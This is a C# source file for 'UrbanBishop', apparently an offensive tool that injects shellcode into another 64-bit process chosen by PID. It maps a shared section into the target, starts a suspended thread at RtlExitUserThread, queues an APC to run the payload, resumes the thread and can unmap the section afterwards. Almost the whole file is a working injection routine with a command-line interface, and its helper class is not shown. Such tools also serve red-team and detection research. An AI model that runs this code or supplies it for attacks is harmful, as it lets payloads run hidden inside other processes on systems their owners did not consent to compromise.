using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace UrbanBishop
{
    class Program
    {
        public static void CastleKingside(String Path, BerlinDefence.PROC_VALIDATION Pv, Int32 ProcId, Boolean Clean)
        {
            // Read in sc bytes
            BerlinDefence.SC_DATA scd = BerlinDefence.ReadShellcode(Path);
            if (scd.iSize == 0)
            {
                Console.WriteLine("[!] Unable to read shellcode bytes..");
                return;
            }

            // Create local section & map view of that section as RW in our process
            Console.WriteLine("\n[>] Creating local section..");
            BerlinDefence.SECT_DATA LocalSect = BerlinDefence.MapLocalSection(scd.iSize);
            if (!LocalSect.isvalid)
            {
                return;
            }

            // Map section into remote process
            Console.WriteLine("[>] Map RX section to remote proc..");
            BerlinDefence.SECT_DATA RemoteSect = BerlinDefence.MapRemoteSection(Pv.hProc, LocalSect.hSection, scd.iSize);
            if (!RemoteSect.isvalid)
            {
                return;
            }

            // Write sc to local section
            Console.WriteLine("[>] Write shellcode to local section..");
            Console.WriteLine("    |-> Size: " + scd.iSize);
            Marshal.Copy(scd.bScData, 0, LocalSect.pBase, (int)scd.iSize);


            // Find remote thread start address offset from base -> RtlExitUserThread
            Console.WriteLine("[>] Seek export offset..");
            Console.WriteLine("    |-> pRemoteNtDllBase: 0x" + String.Format("{0:X}", (Pv.pNtllBase).ToInt64()));
            IntPtr pFucOffset = BerlinDefence.GetLocalExportOffset("ntdll.dll", "RtlExitUserThread");
            if (pFucOffset == IntPtr.Zero)
            {
                return;
            }

            // Create suspended thread at RtlExitUserThread in remote proc
            Console.WriteLine("[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..");
            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr pRemoteStartAddress = (IntPtr)((Int64)Pv.pNtllBase + (Int64)pFucOffset);
            UInt32 CallResult = BerlinDefence.NtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, Pv.hProc, pRemoteStartAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
            if (hRemoteThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to create remote thread..");
                return;
            } else
            {
                Console.WriteLine("    |-> Success");
            }

            // Queue APC
            Console.WriteLine("[>] Set APC trigger & resume thread..");
            CallResult = BerlinDefence.NtQueueApcThread(hRemoteThread, RemoteSect.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (CallResult ==  0)
            {
                Console.WriteLine("    |-> NtQueueApcThread");
            } else
            {
                Console.WriteLine("[!] Unable register APC..");
                return;
            }

            // Resume thread
            UInt32 SuspendCount = 0;
            CallResult = BerlinDefence.NtAlertResumeThread(hRemoteThread, ref SuspendCount);
            if (CallResult == 0)
            {
                Console.WriteLine("    |-> NtAlertResumeThread");
            } else
            {
                Console.WriteLine("[!] Failed to resume thread..");
            }

            // Wait & clean up?
            if (Clean)
            {
                Console.WriteLine("[>] Waiting for payload to finish..");
                while (true)
                {
                    BerlinDefence.THREAD_BASIC_INFORMATION ts = BerlinDefence.GetThreadState(hRemoteThread);
                    if (ts.ExitStatus != 259) // STILL_ACTIVE
                    {
                        Console.WriteLine("    |-> Thread exit status -> " + ts.ExitStatus);
                        UInt32 Unmap = BerlinDefence.NtUnmapViewOfSection(Pv.hProc, RemoteSect.pBase);
                        if (Unmap == 0)
                        {
                            Console.WriteLine("    |-> NtUnmapViewOfSection");
                        } else
                        {
                            Console.WriteLine("[!] Failed to unmap remote section..");
                        }
                        break;
                    }
                    System.Threading.Thread.Sleep(400); // Sleep precious, sleep
                }
            }
        }

        static void Main(string[] args)
        {
            BerlinDefence.PrintBanner();
            if (args.Length == 0)
            {
                BerlinDefence.GetHelp();
            } else
            {
                int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
                int iPID = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
                int bClean = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(c|Clean)$").Match(s).Success);
                if (iPathScBin != -1 && iPID != -1)
                {
                    Boolean Clean = false;
                    if (bClean != -1)
                    {
                        Clean = true;
                    }

                    try
                    {
                        String sPathScBin = args[(iPathScBin + 1)];
                        Int32 Proc = int.Parse(args[(iPID + 1)]);
                        Boolean bFilePath = BerlinDefence.PathIsFile(sPathScBin);
                        BerlinDefence.PROC_VALIDATION pv = BerlinDefence.ValidateProc(Proc);

                        if (!bFilePath || !pv.isvalid || pv.hProc == IntPtr.Zero)
                        {
                            if (!pv.isvalid)
                            {
                                Console.WriteLine("[!] Invalid PID specified (-i|--Inject)..");
                            } else
                            {
                                Console.WriteLine("[!] Unable to aquire process handle (-i|--Inject)..");
                            }
                            return;
                        } else
                        {
                            Console.WriteLine("|--------");
                            Console.WriteLine("| Process    : " + pv.sName);
                            Console.WriteLine("| Handle     : " + pv.hProc);
                            Console.WriteLine("| Is x32     : " + pv.isWow64);
                            Console.WriteLine("| Sc binpath : " + sPathScBin);
                            Console.WriteLine("|--------");

                            if (pv.isWow64)
                            {
                                Console.WriteLine("\n[!] Injection is only supported for 64-bit processes..");
                                return;
                            }

                            CastleKingside(sPathScBin, pv, Proc, Clean);
                        }

                    } catch
                    {
                        BerlinDefence.GetHelp();
                    }
                } else
                {
                    BerlinDefence.GetHelp();
                }
            }
        }
    }
}
